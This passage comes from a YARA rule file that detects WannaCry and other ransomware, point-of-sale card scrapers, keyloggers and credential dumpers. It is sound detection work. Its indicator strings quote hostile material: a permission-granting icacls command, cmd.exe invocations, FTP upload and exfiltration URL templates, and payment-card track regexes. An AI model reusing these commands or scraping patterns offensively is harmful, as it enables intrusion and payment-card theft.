$rwnry at 88195 and $swnry at 88656 and $rwnry at 4495639
}
rule SSC_ransom_telefonica : TELEF
{
meta:
author = "Jaume Martin <@Xumeiquer>"
description = "Ransmoware Telefonica"
date = "2017-05-13"
reference = "http://www.elmundo.es/tecnologia/2017/05/12/59158a8ce5fdea194f8b4616.html"
md5 = "7f7ccaa16fb15eb1c7399d422f8363e8"
sha256 = "2584e1521065e45ec3c17767c065429038fc6291c091097ea8b22c8a502c41dd"
strings:
$a = "RegCreateKeyW" wide ascii nocase
$b = "cmd.exe /c"
$c = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn" ascii
$d = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw" ascii
$e = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94" ascii
$f = "tasksche.exe"
condition:
uint16(0) == 0x5A4D and $a and for all of ($b, $c, $d, $e, $f) : (@ > @a)
}
rule SSC_WannCry_m_vbs {
meta:
description = "Detects WannaCry Ransomware VBS"
author = "Florian Roth"
reference = "https://goo.gl/HG2j5T"
date = "2017-05-12"
hash1 = "51432d3196d9b78bdc9867a77d601caffd4adaa66dcac944a5ba0b3112bbea3b"
strings:
$x1 = ".TargetPath = \"C:\\@" ascii
$x2 = ".CreateShortcut(\"C:\\@" ascii
$s3 = " = WScript.CreateObject(\"WScript.Shell\")" ascii
condition:
( uint16(0) == 0x4553 and filesize < 1KB and all of them )
}
rule SSC_NHS_Strain_Wanna: NHS_Strain_Wanna
{
meta:
description = "Detection for worm-strain bundle of Wcry, DOublePulsar"
MD5 = "db349b97c37d22f5ea1d1841e3c89eb4"
SHA1 = "e889544aff85ffaf8b0d0da705105dee7c97fe26"
SHA256 = "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c"
INFO = "Looks for specific offsets of c.wnry and t.wnry strings"
strings:
$cwnry = { 63 2e 77 6e 72 79 }
$twnry = { 74 2e 77 6e 72 79 }
condition:
$cwnry at 262324 and $twnry at 267672 and $cwnry at 284970
}
rule SSC_WannaCry_Ransomware {
meta:
description = "Detects WannaCry Ransomware"
author = "Florian Roth (with the help of binar.ly)"
reference = "https://goo.gl/HG2j5T"
date = "2017-05-12"
hash1 = "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
strings:
$x1 = "icacls . /grant Everyone:F /T /C /Q" fullword ascii
$x2 = "taskdl.exe" fullword ascii
$x3 = "tasksche.exe" fullword ascii
$x4 = "Global\\MsWinZonesCacheCounterMutexA" fullword ascii
$x5 = "WNcry@2ol7" fullword ascii
$x6 = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
$x7 = "mssecsvc.exe" fullword ascii
$x8 = "C:\\%s\\qeriuwjhrf" fullword ascii
$x9 = "icacls . /grant Everyone:F /T /C /Q" fullword ascii
$s1 = "C:\\%s\\%s" fullword ascii
$s2 = "<!-- Windows 10 --> " fullword ascii
$s3 = "cmd.exe /c \"%s\"" fullword ascii
$s4 = "msg/m_portuguese.wnry" fullword ascii
$s5 = "\\\\192.168.56.20\\IPC$" fullword wide
$s6 = "\\\\172.16.99.5\\IPC$" fullword wide
$op1 = { 10 ac 72 0d 3d ff ff 1f ac 77 06 b8 01 00 00 00 }
$op2 = { 44 24 64 8a c6 44 24 65 0e c6 44 24 66 80 c6 44 }
$op3 = { 18 df 6c 24 14 dc 64 24 2c dc 6c 24 5c dc 15 88 }
$op4 = { 09 ff 76 30 50 ff 56 2c 59 59 47 3b 7e 0c 7c }
$op5 = { c1 ea 1d c1 ee 1e 83 e2 01 83 e6 01 8d 14 56 }
$op6 = { 8d 48 ff f7 d1 8d 44 10 ff 23 f1 23 c1 }
condition:
uint16(0) == 0x5a4d and filesize < 10000KB and ( 1 of ($x*) and 1 of ($s*) or 3 of ($op*) )
}
rule SSC_WannaCry_Ransomware_Dropper
{
meta:
description = "WannaCry Ransomware Dropper"
reference = "https://www.cylance.com/en_us/blog/threat-spotlight-inside-the-wannacry-attack.html"
date = "2017-05-12"
strings:
$s1 = "cmd.exe /c \"%s\"" fullword ascii
$s2 = "tasksche.exe" fullword ascii
$s3 = "icacls . /grant Everyone:F /T /C /Q" fullword ascii
$s4 = "Global\\MsWinZonesCacheCounterMutexA" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 4MB and all of them
}
rule SSC_WannCry_BAT {
meta:
description = "Detects WannaCry Ransomware BATCH File"
author = "Florian Roth"
reference = "https://goo.gl/HG2j5T"
date = "2017-05-12"
hash1 = "f01b7f52e3cb64f01ddc248eb6ae871775ef7cb4297eba5d230d0345af9a5077"
strings:
$s1 = "@.exe\">> m.vbs" ascii
$s2 = "cscript.exe //nologo m.vbs" fullword ascii
$s3 = "echo SET ow = WScript.CreateObject(\"WScript.Shell\")> " ascii
$s4 = "echo om.Save>> m.vbs" fullword ascii
condition:
( uint16(0) == 0x6540 and filesize < 1KB and 1 of them )
}
rule SSC_Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549: Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549
{
meta:
description = "Specific sample match for WannaCryptor"
MD5 = "84c82835a5d21bbcf75a61706d8ab549"
SHA1 = "5ff465afaabcbf0150d1a3ab2c2e74f3a4426467"
SHA256 = "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
INFO = "Looks for 'taskdl' and 'taskse' at known offsets"
strings:
$taskdl = { 00 74 61 73 6b 64 6c }
$taskse = { 00 74 61 73 6b 73 65 }
condition:
$taskdl at 3419456 and $taskse at 3422953
}
rule SSC_MS17_010_WanaCry_worm {
meta:
description = "Worm exploiting MS17-010 and dropping WannaCry Ransomware"
author = "Felipe Molina (@felmoltor)"
reference = "https://www.exploit-db.com/exploits/41987/"
date = "2017/05/12"
strings:
$ms17010_str1="PC NETWORK PROGRAM 1.0"
$ms17010_str2="LANMAN1.0"
$ms17010_str3="Windows for Workgroups 3.1a"
$ms17010_str4="__TREEID__PLACEHOLDER__"
$ms17010_str5="__USERID__PLACEHOLDER__"
$wannacry_payload_substr1 = "h6agLCqPqVyXi2VSQ8O6Yb9ijBX54j"
$wannacry_payload_substr2 = "h54WfF9cGigWFEx92bzmOd0UOaZlM"
$wannacry_payload_substr3 = "tpGFEoLOU6+5I78Toh/nHs/RAP"
condition:
all of them
}
rule SSC_WannaCry_RansomNote {
meta:
description = "Detects WannaCry Ransomware Note"
author = "Florian Roth"
reference = "https://goo.gl/HG2j5T"
date = "2017-05-12"
hash1 = "4a25d98c121bb3bd5b54e0b6a5348f7b09966bffeec30776e5a731813f05d49e"
strings:
$s1 = "A:  Don't worry about decryption." fullword ascii
$s2 = "Q:  What's wrong with my files?" fullword ascii
condition:
( uint16(0) == 0x3a51 and filesize < 2KB and all of them )
}
rule SSC_Locky_Ransomware_2: ransom {
meta:
description = "Regla para detectar RANSOM.LOCKY"
author = "CCN-CERT"
version = "1.0"
strings:
$a1 = { 2E 00 6C 00 6F 00 63 00 6B 00 79 00 00 }
$a2 = { 00 5F 00 4C 00 6F 00 63 00 6B 00 79 00 }
$a3 = { 5F 00 72 00 65 00 63 00 6F 00 76 00 65 }
$a4 = { 00 72 00 5F 00 69 00 6E 00 73 00 74 00 }
$a5 = { 72 00 75 00 63 00 74 00 69 00 6F 00 6E }
$a6 = { 00 73 00 2E 00 74 00 78 00 74 00 00 }
$a7 = { 53 6F 66 74 77 61 72 65 5C 4C 6F 63 6B 79 00 }
condition:
all of them
}
rule SSC_Locky_Ransomware : ransom {
meta:
description = "Detects Locky Ransomware (matches also on Win32/Kuluoz)"
author = "Florian Roth (with the help of binar.ly)"
reference = "https://goo.gl/qScSrE"
date = "2016-02-17"
hash = "5e945c1d27c9ad77a2b63ae10af46aee7d29a6a43605a9bfbf35cebbcff184d8"
strings:
$o1 = { 45 b8 99 f7 f9 0f af 45 b8 89 45 b8 } // address=0x4144a7
$o2 = { 2b 0a 0f af 4d f8 89 4d f8 c7 45 } // address=0x413863
condition:
all of ($o*)
}
rule SSC_GoldenEye_Ransomware_XLS {
meta:
description = "GoldenEye XLS with Macro - file Schneider-Bewerbung.xls"
author = "Florian Roth"
reference = "https://goo.gl/jp2SkT"
date = "2016-12-06"
hash1 = "2320d4232ee80cc90bacd768ba52374a21d0773c39895b88cdcaa7782e16c441"
strings:
$x1 = "fso.GetTempName();tmp_path = tmp_path.replace('.tmp', '.exe')" fullword ascii
$x2 = "var shell = new ActiveXObject('WScript.Shell');shell.run(t'" fullword ascii
condition:
( uint16(0) == 0xcfd0 and filesize < 4000KB and 1 of them )
}
rule SSC_GoldenEyeRansomware_Dropper_MalformedZoomit {
meta:
description = "Auto-generated rule - file b5ef16922e2c76b09edd71471dd837e89811c5e658406a8495c1364d0d9dc690"
author = "Florian Roth"
reference = "https://goo.gl/jp2SkT"
date = "2016-12-06"
hash1 = "b5ef16922e2c76b09edd71471dd837e89811c5e658406a8495c1364d0d9dc690"
strings:
$s1 = "ZoomIt - Sysinternals: www.sysinternals.com" fullword ascii
$n1 = "Mark Russinovich" wide
condition:
( uint16(0) == 0x5a4d and filesize < 800KB and $s1 and not $n1 )
}
rule SSC_Erebus: ransom
{
meta:
description = "Erebus Ransomware"
author = "Joan Soriano / @joanbtl"
date = "2017-06-23"
version = "1.0"
MD5 = "27d857e12b9be5d43f935b8cc86eaabf"
SHA256 = "0b7996bca486575be15e68dba7cbd802b1e5f90436ba23f802da66292c8a055f"
ref1 = "http://blog.trendmicro.com/trendlabs-security-intelligence/erebus-resurfaces-as-linux-ransomware/"
strings:
$a = "/{5f58d6f0-bb9c-46e2-a4da-8ebc746f24a5}//log.log"
$b = "EREBUS IS BEST."
condition:
all of them
}
rule SSC_cerber5b {
meta:
author = "pekeinfo"
date = "2016-12-20"
description = "Cerber5b"
strings:
$a={8B ?? ?8 ?? 4? 00 83 E? 02 89 ?? ?8 ?? 4? 00 68 ?C ?9 4? 00 [0-6] ?? ?? ?? ?? ?? ?8 ?? 4? 00 5? FF 15 ?? ?9 4? 00 89 45 ?4 83 7D ?4 00 75 02 EB 12 8B ?? ?0 83 C? 06 89 ?? ?0 B? DD 03 00 00 85}
condition:
$a
}
rule SSC_cerber5 {
meta:
author = "pekeinfo"
date = "2016-12-02"
description = "Cerber5"
strings:
$a = {83 C4 04 A3 ?? ?? ?? 00 C7 45 ?? ?? ?? ?? 00 8B ?? ?? C6 0? 56 8B ?? ?? 5? 68 ?? ?? 4? 00 FF 15 ?? ?? 4? 00 50 FF 15 ?? ?? 4? 00 A3 ?? ?? 4? 00 68 1D 10 00 00 E8 ?? ?? FF FF 83 C4 04 ?? ?? ??}
condition:
1 of them
}
rule SSC_cerber4 {
meta:
author = "pekeinfo"
date = "2016-09-09"
description = "Cerber4"
strings:
$a = {8B 0D ?? ?? 43 00 51 8B 15 ?? ?? 43 00 52 E8 C9 04 00 00 83 C4 08 89 45 FC A1 ?? ?? 43 00 3B 05 ?? ?? 43 00 72 02}
condition:
1 of them
}
rule SSC_cerber3 {
meta:
author = "pekeinfo"
date = "2016-09-09"
description = "Cerber3 "
strings:
$a = {00 6A 00 68 80 00 00 00 6A 03 6A 00 6A 03 6A  01 8B 85}
$b = {68 3B DB 00 00 ?? ?? ?? ?? 00 ?? FF 15}
condition:
1 of them
}
rule SSC_Ransom_CryptXXX_Dropper
{
/*
Regla para detectar el dropper de Ransom.CryptXXX con MD5 d01fd2bb8c6296d51be297978af8b3a1
*/
meta:
description = "Regla para detectar RANSOM.CRYPTXXX"
author      = "CCN-CERT"
version     = "1.0"
strings:
$a = { 50 65 31 57 58 43 46 76 59 62 48 6F 35 }
$b = { 43 00 3A 00 5C 00 42 00 49 00 45 00 52 00 5C 00 51 00 6D 00 6B 00 4E 00 52 00 4C 00 46 00 00 }
condition:
all of them
}
rule SSC_Ransom_CryptXXX_Real
{
/*
Regla para detectar el codigo Ransom.CryptXXX fuera del dropper con MD5 ae06248ab3c02e1c2ca9d53b9a155199
*/
meta:
description = "Regla para detectar Ransom.CryptXXX original"
author      = "CCN-CERT"
version     = "1.0"
strings:
$a = { 52 59 47 40 4A 41 59 5D 52 00 00 00 FF FF FF FF }
$b = { 06 00 00 00 52 59 47 40 40 5A 00 00 FF FF FF FF }
$c = { 0A 00 00 00 52 5C 4B 4D 57 4D 42 4B 5C 52 00 00 }
$d = { FF FF FF FF 0A 00 00 00 52 5D 57 5D 5A 4B 43 70 }
$e = { 3F 52 00 00 FF FF FF FF 06 00 00 00 52 4C 41 41 }
$f = { 5A 52 00 00 FF FF FF FF 0A 00 00 00 52 5C 4B 4D }
$g = { 41 58 4B 5C 57 52 00 00 FF FF FF FF 0E 00 00 00 }
$h = { 52 2A 5C 4B 4D 57 4D 42 4B 20 4C 47 40 52 00 00 }
$i = { FF FF FF FF 0A 00 00 00 52 5E 4B 5C 48 42 41 49 }
$j = { 5D 52 00 00 FF FF FF FF 05 00 00 00 52 4B 48 47 }
$k = { 52 00 00 00 FF FF FF FF 0C 00 00 00 52 4D 41 40 }
$l = { 48 47 49 20 43 5D 47 52 00 00 00 00 FF FF FF FF }
$m = { 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 3F 52 00 00 }
$n = { FF FF FF FF 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 }
$o = { 3C 52 00 00 FF FF FF FF 08 00 00 00 52 49 41 41 }
$p = { 49 42 4B 52 00 00 00 00 FF FF FF FF 06 00 00 00 }
$q = { 52 5A 4B 43 5E 52 00 00 FF FF FF FF 08 00 00 00 }
$v = { 52 48 3A 4C 4D 70 3F 52 00 00 00 00 FF FF FF FF }
$w = { 0A 00 00 00 52 4F 42 42 5B 5D 4B 70 3F 52 00 00 }
$x = { FF FF FF FF 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 }
$y = { 3F 52 00 00 FF FF FF FF 0A 00 00 00 52 5E 5C 41 }
$z = { 49 5C 4F 70 3C 52 00 00 FF FF FF FF 09 00 00 00 }
$aa = { 52 4F 5E 5E 4A 4F 5A 4F 52 00 00 00 FF FF FF FF }
$ab = { 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 3D 52 00 00 }
$ac = { FF FF FF FF 08 00 00 00 52 5E 5B 4C 42 47 4D 52 }
condition:
all of them
}
rule SSC_SpyGate_v2_9
{
meta:
date = "2014/09"
maltype = "Spygate v2.9 Remote Access Trojan"
filetype = "exe"
reference = "https://blogs.mcafee.com/mcafee-labs/middle-east-developer-spygate-struts-stuff-online"
strings:
$1 = "shutdowncomputer" wide
$2 = "shutdown -r -t 00" wide
$3 = "blockmouseandkeyboard" wide
$4 = "ProcessHacker"
$5 = "FileManagerSplit" wide
condition:
all of them
}
rule SSC_dump_tool
{
meta:
author = "@patrickrolsen"
reference = "Related to pwdump6 and fgdump tools"
strings:
$s1 = "lsremora"
$s2 = "servpw"
$s3 = "failed: %d"
$s4 = "fgdump"
$s5 = "fgexec"
$s6 = "fgexecpipe"
condition:
uint16(0) == 0x5A4D and 3 of ($s*)
}
rule SSC_regex_pos
{
meta:
author = "@patrickrolsen"
reference = "POS malware - Regex"
strings:
$n1 = "REGEXEND" nocase
$n2 = "RegExpr" nocase
$n3 = "regex"
$s4 = "[1-5][0-9]{14}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
$s5 = "[47][0-9]{13}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
$s6 = "(?:0[0-5]|[68][0-9])[0-9]{11}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
$s7 = "(?:011|5[0-9]{2})[0-9]{12}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
$s8 = "(?:2131|1800|35\\d{3})\\d{11}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
$s9 = "([0-9]{15,16}[D=](0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9]{8,30})"
$s10 = "((b|B)[0-9]{13,19}\\^[A-Za-z\\s]{0,30}\\/[A-Za-z\\s]{0,30}\\^(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9\\s]{3,50}[0-9]{1})"
$s11 = "[0-9]*\\^[a-zA-Z]*/[a-zA-Z ]*\\^[0-9]*"
$s12 = "\\d{15,19}=\\d{13,}"
$s13 = "\\;?[3-9]{1}[0-9]{12,19}[D=\\u0061][0-9]{10,30}\\??"
$s14 = "[0-9]{12}(?:[0-9]{3})?=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
condition:
uint16(0) == 0x5A4D and 1 of ($n*) and 1 of ($s*)
}
rule SSC_unknown
{
meta:
author = "@patrickrolsen"
reference = "Unknown POS"
strings:
$s1 = "a.exe" wide
$s2 = "Can anyone test" wide
$s3 = "I m in computer class now" wide
condition:
uint16(0) == 0x5A4D and 3 of ($s*)
}
rule SSC_monitor_tool_pos
{
meta:
author = "@patrickrolsen"
reference = "POS malware - Monitoring Tool??"
strings:
$s1 = "RCPT TO"
$s2 = "MAIL FROM"
$s3 = "AUTH LOGIN"
$s4 = "Reply-To"
$s5 = "X-Mailer"
$s6 = "crypto"
$s7 = "test335.txt" wide
$s8 = "/c del"
condition:
uint16(0) == 0x5A4D and 7 of ($s*)
}
rule SSC_pos_uploader
{
meta:
author = "@patrickrolsen"
maltype = "Point of Sale (POS) Malware"
reference = "http://blogs.mcafee.com/mcafee-labs/analyzing-the-target-point-of-sale-malware"
version = "0.1"
description = "Testing the base64 encoded file in sys32"
date = "01/30/2014"
strings:
$s1 = "cmd /c net start %s"
$s2 = "ftp -s:%s"
$s3 = "data_%d_%d_%d_%d_%d.txt"
$s4 = "\\uploader\\"
condition:
uint16(0) == 0x5A4D and all of ($s*)
}
rule SSC_lacy_keylogger
{
meta:
author = "@patrickrolsen"
reference = "Appears to be a form of keylogger."
strings:
$s1 = "Lacy.exe" wide
$s2 = "Bldg Chive Duel Rip Query" wide
condition:
uint16(0) == 0x5A4D and all of ($s*)
}
rule SSC_winxml_dll
{
meta:
author = "@patrickrolsen"
maltype = "Point of Sale (POS) Malware"
reference = "ce0296e2d77ec3bb112e270fc260f274"
version = "0.1"
description = "Testing the base64 encoded file in sys32"
date = "01/30/2014"
strings:
$s1 = "\\system32\\winxml.dll"
//$s2 = "cmd /c net start %s"
//$s3 = "=== pid:"
//$s4 = "GOTIT"
//$s5 = ".memdump"
//$s6 = "POSWDS"
condition:
uint16(0) == 0x5A4D and (all of ($s*))
}
rule SSC_sets_pos
{
meta:
author = "@patrickrolsen"
reference = "POS malware - Sets"
strings:
$s1 = "GET /sets.txt"
condition:
uint16(0) == 0x5A4D and $s1
}
rule SSC_searchinject
{
meta:
author = "@patrickrolsen"
reference = "Usage: SearchInject <PID1>[PID2][PID3] - It loads Searcher.dll (appears to be hard coded)"
strings:
$s1 = "SearchInject"
$s2 = "inject base:"
$s3 = "Searcher.dll" nocase
condition:
uint16(0) == 0x5A4D and all of ($s*)
}
rule SSC_pstgdump
{
meta:
author = "@patrickrolsen"
reference = "pstgdump"
strings:
$s1 = "fgdump\\pstgdump"
$s2 = "pstgdump"
$s3 = "Outlook"
condition:
uint16(0) == 0x5A4D and all of ($s*)
}
rule SSC_memdump_diablo
{
meta:
author = "@patrickrolsen"
reference = "Process Memory Dumper - DiabloHorn"
strings:
$s1 = "DiabloHorn"
$s2 = "Process Memory Dumper"
$s3 = "pid-%s.dmp"
$s4 = "Pid %d in not acessible" // SIC
$s5 = "memdump.exe"
$s6 = "%s-%d.dmp"
condition:
uint16(0) == 0x5A4D and 3 of ($s*)
}
rule SSC_sysocmgr
{
meta:
author = "@patrickrolsen"
reference = "System stand-alone Optional Component Manager - http://support.microsoft.com/kb/222444"
strings:
$s1 = "SYSOCMGR.EXE" wide
$s2 = "System stand-alone Optional Component Manager" wide
condition:
uint16(0) == 0x5A4D and all of ($s*)
}
rule SSC_pos_malwre_dexter_stardust
{
meta:
author = "@patrickrolsen"
maltype = "Dexter Malware - StarDust Variant"
version = "0.1"
description = "Table 2 arbornetworks.com/asert/wp-content/uploads/2013/12/Dexter-and-Project-Hook-Break-the-Bank.pdf"
reference = "16b596de4c0e4d2acdfdd6632c80c070, 2afaa709ef5260184cbda8b521b076e1, and e3dd1dc82ddcfaf410372ae7e6b2f658"
date = "12/30/2013"
strings:
$s1 = "ceh_3\\.\\ceh_4\\..\\ceh_6"
$s2 = "Yatoed3fe3rex23030am39497403"
$s3 = "Poo7lo276670173quai16568unto1828Oleo9eds96006nosysump7hove19"
$s4 = "CommonFile.exe"
condition:
uint16(0) == 0x5A4D and all of ($s*)
}
rule SSC_pos_malware_project_hook
{
meta:
author = "@patrickrolsen"
maltype = "Project Hook"
version = "0.1"
description = "Table 1 arbornetworks.com/asert/wp-content/uploads/2013/12/Dexter-and-Project-Hook-Break-the-Bank.pdf"
reference = "759154d20849a25315c4970fe37eac59"
date = "12/30/2013"
strings:
$s1 = "CallImage.exe"
$s2 = "BurpSwim"
$s3 = "Work\\Project\\Load"
$s4 = "WortHisnal"
condition:
uint16(0) == 0x5A4D and all of ($s*)
}
rule SSC_regexpr_pos
{
meta:
author = "@patrickrolsen"
reference = "POS malware - RegExpr"
strings:
$s1 = "RegExpr" nocase
$s2 = "Data.txt"
$s3 = "Track1"
$s4 = "Track2"
condition:
uint16(0) == 0x5A4D and 3 of ($s*)
}
rule SSC_pos_jack
{
meta:
author = "@patrickrolsen"
maltype = "Point of Sale (POS) Malware"
version = "0.1"
reference = "http://blog.spiderlabs.com/2014/02/jackpos-the-house-always-wins.html"
date = "2/22/2014"
strings:
$pdb1 = "\\ziedpirate.ziedpirate-PC\\"
$pdb2 = "\\sop\\sop\\"
condition:
uint16(0) == 0x5A4D and 1 of ($pdb*)
}
rule SSC_heistenberg_pos
{
meta:
author = "@patrickrolsen"
reference = "POS Malware"
strings:
$s1 = "KARTOXA"
$s2 = "dmpz.log"
$s3 = "/api/process.php?xy="
$s4 = "User-Agent: PCICompliant" // PCICompliant/3.33
$s6 = "%s:*:Enabled:%s"
condition:
uint16(0) == 0x5A4D and 3 of ($s*)
}
rule SSC_keyfinder_tool
{
meta:
author = "@patrickrolsen"
reference = "Magical Jelly Bean KeyFinder"
strings:
$s1 = "chgxp.vbs"
$s2 = "officekey.exe"
$s3 = "findkey.exe"
$s4 = "xpkey.exe"
condition:
uint16(0) == 0x5A4D and 2 of ($s*)
}
rule SSC_reg_pos
{
meta:
author = "@patrickrolsen"
reference = "POS malware - RegExpr"
strings:
$s1 = "T1_FOUND: %s"
$s2 = "id=%s&log=%s"
$s3 = "\\d{15,19}=\\d{13,}"
condition:
uint16(0) == 0x5A4D and 2 of ($s*)
}
rule SSC_misc_pos
{
meta:
author = "@patrickrolsen"
reference = "POS Malware"
strings:
$s1 = "KAPTOXA"
$s2 = "cmd /c net start %s"
$s3 = "pid:"
$s4 = "%ADD%"
$s5 = "COMSPEC"
$s6 = "KARTOXA"
condition:
uint16(0) == 0x5A4D and 3 of ($s*)
}
rule SSC_pos_chewbacca
{
meta:
author = "@patrickrolsen"
maltype = "Point of Sale (POS) Malware"
reference = "https://www.securelist.com/en/blog/208214185/ChewBacca_a_new_episode_of_Tor_based_Malware"
hashes = "21f8b9d9a6fa3a0cd3a3f0644636bf09, 28bc48ac4a92bde15945afc0cee0bd54"
version = "0.2"
description = "Testing the base64 encoded file in sys32"
date = "01/30/2014"
strings:
$s1 = "tor -f <torrc>"
$s2 = "tor_"
$s3 = "umemscan"
$s4 = "CHEWBAC"
condition:
uint16(0) == 0x5A4D and (all of ($s*))
}
rule SSC_pdb_strings_Rescator
{
meta:
author = "@patrickrolsen"
maltype = "Target Attack"
version = "0.3"
description = "Rescator PDB strings within binaries"
date = "01/30/2014"
strings:
$pdb1 = "\\Projects\\Rescator" nocase
condition:
uint16(0) == 0x5A4D and $pdb1
}
rule SSC_pos_memory_scrapper_
{
meta:
author = "@patrickrolsen"
maltype = "Point of Sale (POS) Malware Memory Scraper"
version = "0.3"
description = "POS Memory Scraper"
date = "01/30/2014"
strings:
$s1 = "kartoxa" nocase
$s2 = "CC2 region:"
$s3 = "CC memregion:"
$s4 = "target pid:"
$s5 = "scan all processes:"
$s6 = "<pid> <PATTERN>"
$s7 = "KAPTOXA"
$s8 = "ATTERN"
$s9 = "\\svhst%p"
condition:
uint16(0) == 0x5A4D and 3 of ($s*)
}
rule SSC_blazingtools
{
meta:
author = "@patrickrolsen"
reference = "Blazing Tools - http://www.blazingtools.com (Keyloggers)"
strings:
$s1 = "blazingtools.com"
$s2 = "Keystrokes" wide
$s3 = "Screenshots" wide
condition:
uint16(0) == 0x5A4D and all of ($s*)
}
rule SSC_Mozart
{
meta:
author = "Nick Hoffman - Morphick Inc"
description = "Detects samples of the Mozart POS RAM scraping utility"
reference = "http://securitykitten.github.io/the-mozart-ram-scraper/"
strings:
$pdb = "z:\\Slender\\mozart\\mozart\\Release\\mozart.pdb" nocase wide ascii
$output = {67 61 72 62 61 67 65 2E 74 6D 70 00}
$service_name = "NCR SelfServ Platform Remote Monitor" nocase wide ascii
$service_name_short = "NCR_RemoteMonitor"
$encode_data = {B8 08 10 00 00 E8 ?? ?? ?? ?? A1 ?? ?? ?? ?? 53 55 8B AC 24 14 10 00 00 89 84 24 0C 10 00 00 56 8B C5 33 F6 33 DB 8D 50 01 8D A4 24 00 00 00 00 8A 08 40 84 C9 ?? ?? 2B C2 89 44 24 0C ?? ?? 8B 94 24 1C 10 00 00 57 8B FD 2B FA 89 7C 24 10 ?? ?? 8B 7C 24 10 8A 04 17 02 86 E0 BA 40 00 88 02 B8 ?? ?? ?? ?? 46 8D 78 01 8D A4 24 00 00 00 00 8A 08 40 84 C9 ?? ?? 2B C7 3B F0 ?? ?? 33 F6 8B C5 43 42 8D 78 01 8A 08 40 84 C9 ?? ?? 2B C7 3B D8 ?? ?? 5F 8B B4 24 1C 10 00 00 8B C5 C6 04 33 00 8D 50 01 8A 08 40 84 C9 ?? ?? 8B 8C 24 20 10 00 00 2B C2 51 8D 54 24 14 52 50 56 E8 ?? ?? ?? ?? 83 C4 10 8B D6 5E 8D 44 24 0C 8B C8 5D 2B D1 5B 8A 08 88 0C 02 40 84 C9 ?? ?? 8B 8C 24 04 10 00 00 E8 ?? ?? ?? ?? 81 C4 08 10 00 00}
condition:
any of ($pdb, $output, $encode_data) or
all of ($service*)
}
rule SSC_LogPOS
{
meta:
author = "Morphick Security"
description = "Detects Versions of LogPOS"
md5 = "af13e7583ed1b27c4ae219e344a37e2b"
strings:
$mailslot = "\\\\.\\mailslot\\LogCC"
$get = "GET /%s?encoding=%c&t=%c&cc=%I64d&process="
//64A130000000      mov eax, dword ptr fs:[0x30]
//8B400C        mov eax, dword ptr [eax + 0xc]
//8B401C        mov eax, dword ptr [eax + 0x1c]
//8B4008        mov eax, dword ptr [eax + 8]
$sc = {64 A1 30 00 00 00 8B 40 0C 8B 40 1C 8B 40 08 }
condition:
$sc and 1 of ($mailslot,$get)
}
rule SSC_PoS_Malware_fastpos2 : FastPOS2
{
meta:
author = "Trend Micro, Inc"
date = "2016-09-21"
description = "Used to detect newer FastPOS variants and their modules."
sample_filetype = "exe"
strings:
$pdb0 ="\\_hookLoader\\Release\\_hookLoader.pdb" nocase
$pdb1 ="\\_hookKlg\\Release\\_hookKlg.pdb" nocase
$pdb2 ="\\_hookKlg\\x64\\Release\\_hookKlg.pdb" nocase
$pdb3 ="\\_hookProc\\Release\\_hookProc.pdb" nocase
$pdb4 ="\\_hookProc\\x64\\Release\\_hookProc.pdb" nocase
$pdb5 ="\\_hookRecvSrvc\\Release\\_hookRecvSrvc.pdb" nocase
$exec_ref0 = "\\kl32.exe"
$exec_ref1 = "\\servhelp.exe"
$exec_ref2 = "\\kbd.exe"
$exec_ref3 = "\\servproc.exe"
$exec_ref4 = "\\service.exe"
$exec_ref5= "\\proc64.exe"
$exec_ref6 = "\\proc32.exe"
$exec_ref7 = "//cdosys.php"
$string0 = "DeleteService"
$string1 = "CreateMailslotA"
$string2 = "StartServiceCtrlDispatcherA"
$string3 = "\\\\.\\mailslot\\trackslot"
$string4 = "Can't install hook service"
$string5 = " -r to remove hook." wide
condition:
(any of ($pdb*)) and (3 of ($exec_ref*)) and (2 of ($string*))
}
rule SSC_PoS_Malware_fastpos : FastPOS POS keylogger
{
meta:
author = "Trend Micro, Inc."
date = "2016-05-18"
description = "Used to detect FastPOS keyloggger + scraper"
reference = "http://documents.trendmicro.com/assets/fastPOS-quick-and-easy-credit-card-theft.pdf"
sample_filetype = "exe"
strings:
$string1 = "uniqyeidclaxemain"
$string2 = "http://%s/cdosys.php"
$string3 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
$string4 = "\\The Hook\\Release\\The Hook.pdb" nocase
condition:
all of ($string*)
}
rule SSC_TreasureHunt
{
meta:
author = "Minerva Labs"
ref ="http://www.minerva-labs.com/#!Cybercriminals-Adopt-the-Mossad-Emblem/c7a5/573da2d60cf2f90ca6f6e3ed"
date = "2016/06"
maltype = "Point of Sale (POS) Malware"
filetype = "exe"
strings:
$a = "treasureHunter.pdb"
$b = "jucheck"
$c = "cmdLineDecrypted"
condition:
all of them
}
rule SSC_easterjackpos {
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2014-09-02"
description = "Identify JackPOS"
strings:
$s1 = "updateinterval="
$s2 = "cardinterval="
$s3 = "{[!17!]}{[!18!]}"
condition:
all of them
}
rule SSC_POS_bruteforcing_bot
{
meta:
maltype = "botnet"
ref = "https://github.com/reed1713"
